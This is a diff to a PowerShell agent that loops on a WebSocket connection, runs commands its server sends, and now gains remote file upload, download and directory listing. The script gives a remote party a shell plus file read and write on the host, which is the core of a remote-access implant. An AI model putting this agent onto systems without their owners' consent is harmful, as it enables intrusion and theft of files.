@@ -39,6 +39,47 @@ function Run-Command {
   }
 }
 
+$MaxFileSize = 5 * 1024 * 1024
+
+function Do-Upload {
+  param([string]$path, [string]$contentB64)
+  try {
+    if ($path -match '\.\.' -or $path -match '^\s*$') { return $null, "invalid path" }
+    $bytes = [Convert]::FromBase64String($contentB64)
+    if ($bytes.Length -gt $MaxFileSize) { return $null, "file too large" }
+    $dir = [System.IO.Path]::GetDirectoryName($path)
+    if ($dir -and -not [System.IO.Directory]::Exists($dir)) { [System.IO.Directory]::CreateDirectory($dir) | Out-Null }
+    [System.IO.File]::WriteAllBytes($path, $bytes)
+    return "ok", $null
+  } catch { return $null, $_.Exception.Message }
+}
+
+function Do-Download {
+  param([string]$path)
+  try {
+    if ($path -match '\.\.' -or $path -match '^\s*$') { return $null, "invalid path" }
+    if (-not [System.IO.File]::Exists($path)) { return $null, "not found" }
+    $info = Get-Item -LiteralPath $path -Force -ErrorAction Stop
+    if ($info.Length -gt $MaxFileSize) { return $null, "file too large" }
+    $bytes = [System.IO.File]::ReadAllBytes($path)
+    return [Convert]::ToBase64String($bytes), $null
+  } catch { return $null, $_.Exception.Message }
+}
+
+function Do-ListDir {
+  param([string]$path)
+  try {
+    if ($path -match '\.\.') { return $null, "invalid path" }
+    if (-not $path) { $path = "." }
+    $items = Get-ChildItem -LiteralPath $path -Force -ErrorAction Stop
+    $list = @()
+    foreach ($i in $items) {
+      $list += @{ name = $i.Name; dir = $i.PSIsContainer; size = if ($i.PSIsContainer) { 0 } else { $i.Length } }
+    }
+    return ($list | ConvertTo-Json -Compress), $null
+  } catch { return $null, $_.Exception.Message }
+}
+
 while ($true) {
   try {
     $ws = [System.Net.WebSockets.ClientWebSocket]::new()
@@ -58,6 +99,19 @@ while ($true) {
         "ping" { $out = "pong" }
         "exec" {
           $out = Run-Command -cmd $cmd.args.command
+        }
+        "upload" {
+          $p = $cmd.args.path; $c = $cmd.args.content
+          $o, $e = Do-Upload -path $p -contentB64 $c
+          if ($e) { $err = $e } else { $out = $o }
+        }
+        "download" {
+          $o, $e = Do-Download -path $cmd.args.path
+          if ($e) { $err = $e } else { $out = $o }
+        }
+        "listdir" {
+          $o, $e = Do-ListDir -path $cmd.args.path
+          if ($e) { $err = $e } else { $out = $o }
         }
         default { $err = "unknown type: $($cmd.type)" }
       }
